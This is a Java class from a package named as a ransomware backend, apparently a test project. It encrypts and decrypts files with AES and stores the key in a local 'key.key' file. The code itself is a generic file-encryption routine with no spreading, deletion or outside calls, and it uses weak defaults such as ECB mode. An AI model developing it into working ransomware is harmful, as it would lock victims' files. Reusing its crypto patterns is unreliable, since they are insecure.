package com.jdrll.test1.ransomewareBackend;

import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;

public class Cifrado {
    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES";

    public static void encrypt(File inputFile, File outputFile) throws CryptoException {
        try {
            // Generar una clave AES aleatoria
            SecretKey secretKey = generateAESKey();

            // Guardar la clave generada para usarla en el descifrado
            saveKey(secretKey, new File("key.key"));

            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);

            try (FileInputStream inputStream = new FileInputStream(inputFile);
                 FileOutputStream outputStream = new FileOutputStream(outputFile)) {

                byte[] inputBytes = new byte[(int) inputFile.length()];
                inputStream.read(inputBytes);

                byte[] outputBytes = cipher.doFinal(inputBytes);

                outputStream.write(outputBytes);
            }

        } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException | BadPaddingException | IllegalBlockSizeException | IOException ex) {
            throw new CryptoException("Error encrypting file", ex);
        }
    }

    public static void decrypt(File inputFile, File outputFile) throws CryptoException {
        try {
            // Cargar la clave AES desde el archivo guardado
            SecretKey secretKey = loadKey(new File("key.key"));

            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(Cipher.DECRYPT_MODE, secretKey);

            try (FileInputStream inputStream = new FileInputStream(inputFile);
                 FileOutputStream outputStream = new FileOutputStream(outputFile)) {

                byte[] inputBytes = new byte[(int) inputFile.length()];
                inputStream.read(inputBytes);

                byte[] outputBytes = cipher.doFinal(inputBytes);

                outputStream.write(outputBytes);
            }

        } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException | BadPaddingException | IllegalBlockSizeException | IOException ex) {
            throw new CryptoException("Error decrypting file", ex);
        }
    }

    private static SecretKey generateAESKey() throws NoSuchAlgorithmException {
        KeyGenerator keyGenerator = KeyGenerator.getInstance(ALGORITHM);
        keyGenerator.init(128); // Tamaño de clave AES 128 bits
        return keyGenerator.generateKey();
    }

    private static void saveKey(SecretKey key, File keyFile) throws IOException {
        byte[] encodedKey = key.getEncoded();
        FileOutputStream fos = new FileOutputStream(keyFile);
        fos.write(encodedKey);
        fos.close();
    }

    private static SecretKey loadKey(File keyFile) throws IOException {
        byte[] encodedKey = Files.readAllBytes(Paths.get(keyFile.getAbsolutePath()));
        return new SecretKeySpec(encodedKey, ALGORITHM);
    }

    public static class CryptoException extends Exception {
        public CryptoException(String message, Throwable throwable) {
            super(message, throwable);
        }
    }
}
